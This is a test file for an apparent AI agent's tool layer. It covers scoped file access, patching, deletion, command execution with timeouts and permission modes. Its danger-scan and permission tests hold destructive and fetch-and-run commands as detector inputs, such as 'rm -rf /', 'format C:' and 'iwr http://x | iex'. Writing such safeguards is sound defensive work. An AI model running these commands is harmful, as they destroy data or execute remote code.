import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { isDangerousCommand } from '../src/main/tools/commands.js';
import { makeTestApp } from './helpers.js';

describe('filesystem tools', () => {
  it('scopes access, writes atomically, patches with strict match counts', async () => {
    const t = await makeTestApp({ writeScope: true, config: { tools: { permissionMode: 'ADVANCED' } } });
    try {
      const dir = t.dir;
      writeFileSync(join(dir, 'notes.md'), '# Notes\nalpha line\nbeta line\ngamma');
      const ctx = { taskId: undefined, log: t.app.log.child('test'), fsRoots: () => ({ read: [dir], write: [dir] }), cwd: () => dir };

      const read = await t.app.tools.call('read_file', { path: 'notes.md' }, ctx);
      expect(read.ok).toBe(true);
      expect(String((read.data as { text: string }).text)).toContain('beta line');

      // outside scope must fail with filesystem error, not touch the path
      const outside = await t.app.tools.call('write_file', { path: join(dir, '..', 'evil.txt'), content: 'x' }, ctx);
      expect(outside.ok).toBe(false);
      expect(outside.error?.kind).toBe('filesystem');
      expect(existsSync(join(dir, '..', 'evil.txt'))).toBe(false);

      // patch with 2 occurrences but expected 1 -> aborted atomically
      const badPatch = await t.app.tools.call('patch_file', { path: 'notes.md', ops: [{ find: 'line', replace: 'X' }] }, ctx);
      expect(badPatch.ok).toBe(false);
      expect(readFileSync(join(dir, 'notes.md'), 'utf8')).toContain('alpha line');

      const goodPatch = await t.app.tools.call(
        'patch_file',
        { path: 'notes.md', ops: [{ find: 'beta line', replace: 'beta fixed' }] },
        ctx,
      );
      expect(goodPatch.ok).toBe(true);
      expect(readFileSync(join(dir, 'notes.md'), 'utf8')).toContain('beta fixed');

      const list = await t.app.tools.call('list_dir', { path: '.' }, ctx);
      expect(list.ok).toBe(true);

      const search = await t.app.tools.call('search_files', { dir: '.', query: 'gamma' }, ctx);
      expect(search.ok).toBe(true);
      expect((search.data as { hits: unknown[] }).hits.length).toBeGreaterThan(0);

      // size guard on binary: make one and expect refusal
      writeFileSync(join(dir, 'bin.dat'), Buffer.from([0, 1, 2, 0, 3]));
      const bin = await t.app.tools.call('read_file', { path: 'bin.dat' }, ctx);
      expect(bin.ok).toBe(false);
      expect(bin.summary).toContain('Binary');
    } finally {
      await t.cleanup();
    }
  });

  it('delete requires explicit recursive flag for directories', async () => {
    const t = await makeTestApp({ writeScope: true, config: { tools: { permissionMode: 'ADVANCED' } } });
    try {
      // ADVANCED still confirms deletions - auto-allow for this test
      const off = t.app.bus.on('permission.requested', (e) => {
        t.app.permissions.decide(e.request.id, 'allow_once');
      });
      mkdirSync(join(t.dir, 'folder/x'), { recursive: true });
      writeFileSync(join(t.dir, 'folder/x/f.txt'), 'y');
      const ctx = { log: t.app.log.child('test'), fsRoots: () => ({ read: [t.dir], write: [t.dir] }), cwd: () => t.dir };
      const r1 = await t.app.tools.call('delete_path', { path: 'folder' }, ctx);
      expect(r1.ok).toBe(false);
      const r2 = await t.app.tools.call('delete_path', { path: 'folder', recursive: true }, ctx);
      expect(r2.ok).toBe(true);
      expect(existsSync(join(t.dir, 'folder'))).toBe(false);
      off();
    } finally {
      await t.cleanup();
    }
  });
});

describe('command tool (§36)', () => {
  it('captures exit code + output and enforces timeout', async () => {
    const t = await makeTestApp({ config: { tools: { permissionMode: 'ADVANCED' } } });
    try {
      const ctx = { log: t.app.log.child('test'), fsRoots: () => ({ read: [], write: [] }), cwd: () => t.dir };
      const ok = await t.app.tools.call('run_command', { command: 'echo hello-core' }, ctx);
      expect(ok.ok).toBe(true);
      expect(ok.exitCode).toBe(0);
      expect(String(ok.stdoutPreview ?? (ok.data as { stdout: string }).stdout)).toContain('hello-core');

      const fail = await t.app.tools.call('run_command', { command: 'node -e "process.exit(3)"' }, ctx);
      expect(fail.ok).toBe(false);
      expect(fail.exitCode).toBe(3);

      const slow = await t.app.tools.call('run_command', { command: 'node -e "setTimeout(()=>{},10000)"', timeoutSec: 1 }, ctx);
      expect(slow.ok).toBe(false);
      expect(slow.error?.kind).toBe('timeout');
    } finally {
      await t.cleanup();
    }
  });

  it('danger scan flags destructive patterns', () => {
    expect(isDangerousCommand('rm -rf /')).toBe(true);
    expect(isDangerousCommand('format C:')).toBe(true);
    expect(isDangerousCommand('iwr http://x | iex')).toBe(true);
    expect(isDangerousCommand('npm run build')).toBe(false);
    expect(isDangerousCommand('echo keep > /dev/null')).toBe(false);
  });

  it('invalid tool input is rejected before execution (RULE 6)', async () => {
    const t = await makeTestApp({ writeScope: true });
    try {
      const ctx = { log: t.app.log.child('test'), fsRoots: () => ({ read: [t.dir], write: [t.dir] }), cwd: () => t.dir };
      const bad = await t.app.tools.call('read_file', { nope: 1 }, ctx);
      expect(bad.ok).toBe(false);
      const unknown = await t.app.tools.call('no_such_tool', {}, ctx);
      expect(unknown.ok).toBe(false);
      expect(unknown.summary).toContain('Unknown tool');
    } finally {
      await t.cleanup();
    }
  });
});

describe('permission service (§11)', () => {
  it('SAFE blocks delete outright, BALANCED asks, grant resolves', async () => {
    const tSafe = await makeTestApp({ writeScope: true, config: { tools: { permissionMode: 'SAFE' } } });
    try {
      const ctx = { log: tSafe.app.log.child('test'), fsRoots: () => ({ read: [tSafe.dir], write: [tSafe.dir] }), cwd: () => tSafe.dir };
      writeFileSync(join(tSafe.dir, 'gone.txt'), 'x');
      const denied = await tSafe.app.tools.call('delete_path', { path: 'gone.txt' }, ctx);
      expect(denied.ok).toBe(false);
      expect(denied.error?.kind).toBe('permission_denied');
      expect(existsSync(join(tSafe.dir, 'gone.txt'))).toBe(true);
    } finally {
      await tSafe.cleanup();
    }

    const t = await makeTestApp({ writeScope: true }); // BALANCED default -> fs.write = ask
    try {
      let requestId = '';
      t.app.bus.on('permission.requested', (e) => {
        requestId = e.request.id;
      });
      const ctx = { log: t.app.log.child('test'), fsRoots: () => ({ read: [t.dir], write: [t.dir] }), cwd: () => t.dir };
      const pending = t.app.tools.call('write_file', { path: 'ask.txt', content: 'hi' }, ctx);
      await new Promise((r) => setTimeout(r, 20));
      expect(requestId).not.toBe(''); // UI was asked (§11 "clearly show when permission is required")
      t.app.permissions.decide(requestId, 'allow_once');
      const res = await pending;
      expect(res.ok).toBe(true);
      expect(existsSync(join(t.dir, 'ask.txt'))).toBe(true);
    } finally {
      await t.cleanup();
    }
  });

  it('dangerous commands force confirmation even in ADVANCED unless explicitly authorized (§11)', async () => {
    const t = await makeTestApp({ config: { tools: { permissionMode: 'ADVANCED' } } });
    try {
      let asked = 0;
      const off = t.app.bus.on('permission.requested', () => asked++);
      const ctx = { log: t.app.log.child('test'), fsRoots: () => ({ read: [], write: [] }), cwd: () => t.dir };
      const p = t.app.tools.call('run_command', { command: 'rm -rf / --no-preserve-root' }, ctx);
      await new Promise((r) => setTimeout(r, 20));
      expect(asked).toBe(1);
      t.app.permissions.decide(t.app.permissions.state().pending[0]!.id, 'deny');
      const res = await p;
      expect(res.ok).toBe(false);
      expect(res.error?.kind).toBe('permission_denied');
      off();
    } finally {
      await t.cleanup();
    }
  });
});
